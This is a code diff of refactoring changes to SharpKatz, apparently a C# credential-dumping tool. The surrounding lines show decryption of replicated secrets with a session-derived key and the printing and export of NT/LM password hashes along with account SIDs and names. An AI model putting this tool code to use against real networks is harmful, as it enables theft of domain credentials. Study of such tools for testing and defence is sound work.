@@ -805,7 +805,7 @@ namespace SharpKatz.Module
         {
             bool result = false;
             SID_NAME_USE sidNameUse;
-            pSid = new byte[0];
+            pSid = Array.Empty<byte>();
             uint cbSid = 0, cchReferencedDomainName = 0;
             StringBuilder sbDomain = new StringBuilder();
             pDomain = "";
@@ -821,7 +821,7 @@ namespace SharpKatz.Module
                 else
                 {
                     pDomain = "";
-                    pSid = new byte[0];
+                    pSid = Array.Empty<byte>();
                 }
             }
             return result;
@@ -979,10 +979,16 @@ namespace SharpKatz.Module
         {
             if (data.Length < 16)
                 return null;
-            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
-            md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
-            md5.TransformFinalBlock(data, 0, 16);
-            byte[] key = md5.Hash;
+
+            byte[] key;
+
+            using (MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider())
+            {
+                md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
+                md5.TransformFinalBlock(data, 0, 16);
+                key = md5.Hash;
+            }
+
             byte[] todecrypt = new byte[data.Length - 16];
             Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
             CRYPTO_BUFFER todecryptBuffer = GetCryptoBuffer(todecrypt);
@@ -1162,7 +1168,7 @@ namespace SharpKatz.Module
             }
             Console.WriteLine("[*]");
 
-            if (ntPwdHistory != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
+            if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
             {
                 Console.WriteLine("[*] Credentials:");
                 if (ntPwdHistory != null)
@@ -1317,12 +1323,13 @@ namespace SharpKatz.Module
 
             if (objectSid != null || samAccountName != null || unicodePwd != null || uac != null)
             {
-                string outstring = string.Format("{0}\t", objectSid);
-                outstring += string.Format("{0}\t", samAccountName);
-                outstring += string.Format("{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
-                outstring += string.Format("{0}", UacToString(Convert.ToInt32(uac)));
+                StringBuilder sb = new StringBuilder();
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", objectSid);
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", samAccountName);
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}\t", Utility.PrintHashBytes((byte[])unicodePwd));
+                sb.AppendFormat(NumberFormatInfo.InvariantInfo, "{0}", UacToString(Convert.ToInt32(uac)));
 
-                sw.WriteLine(outstring);
+                sw.WriteLine(sb.ToString());
             }
 
             sw.Close();
